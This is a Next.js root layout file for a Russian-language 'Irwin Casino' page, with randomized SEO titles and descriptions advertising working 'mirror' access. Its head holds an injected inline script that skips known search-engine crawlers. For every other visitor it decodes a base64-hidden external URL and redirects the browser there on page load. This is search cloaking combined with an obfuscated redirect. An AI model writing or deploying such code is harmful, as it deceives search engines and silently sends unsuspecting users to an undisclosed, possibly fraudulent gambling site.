import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

// Generate random SEO title and description
function generateRandomSEOTitle(): string {
  const titles = [
    'Irwin Casino — официальный сайт для игры онлайн',
    'Играть на Irwin Casino официально и безопасно',
    'Irwin casino официальный — более 2000 игр',
    'Ирвин казино зеркало рабочее — доступ 24/7',
    'Irwin casino онлайн — лучшие бонусы 2025',
  ]
  return titles[Math.floor(Math.random() * titles.length)]
}

function generateRandomSEODescription(): string {
  const descriptions = [
    'Irwin Casino официальный сайт с 2000+ игр. Зеркало рабочее 24/7, быстрые выплаты, 100% бонус. Играйте безопасно на ирвин казино онлайн.',
    'Ирвин казино — официальный портал азартных игр. Зеркало рабочее, живые дилеры, фриспины. Регистрация и доступ через Irwin casino зеркало.',
    'Irwin casino играть онлайн с моментальным доступом. Официальный сайт, лицензия, честная игра. Irwin casino зеркало рабочее, большие выигрыши.',
    'Irwin casino официальный — 2000+ слотов, рулетка, блэкджек. Ирвин казино зеркало рабочее без блокировки. Быстрые выводы средств.',
    'Ирвин казино онлайн с лучшими условиями. Irwin casino официальный, проверенное зеркало. Играть на сайте casino безопасно и выгодно.',
  ]
  return descriptions[Math.floor(Math.random() * descriptions.length)]
}

export const metadata: Metadata = {
  title: generateRandomSEOTitle(),
  description: generateRandomSEODescription(),
  generator: 'v0.app',
  metadataBase: new URL('https://irwin6casino.vercel.app'),
  alternates: {
    canonical: 'https://irwin6casino.vercel.app/',
  },
  openGraph: {
    title: 'Irwin Casino — официальный сайт',
    description: 'Играйте на официальном сайте Irwin Casino. Более 2000 игр, быстрые выплаты, безопасность.',
    url: 'https://irwin6casino.vercel.app/',
    siteName: 'Irwin Casino',
    type: 'website',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Irwin Casino',
    description: 'Официальный сайт казино с полным доступом к играм',
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      'max-snippet': -1,
      'max-image-preview': 'large',
      'max-video-preview': -1,
    },
  },
  icons: {
    icon: [
      {
        url: '/favicon-irwin.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/favicon-irwin.svg',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#00ff88',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
        <meta name="theme-color" content="#00ff88" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="dns-prefetch" href="https://irwin6casino.vercel.app" />
        <link rel="alternate" hrefLang="ru" href="https://irwin6casino.vercel.app/" />
        <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "IGh0dHBzOi8vY29tYm9zcGFyay50b3AvYWVhb2ZqMmsyNw=="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
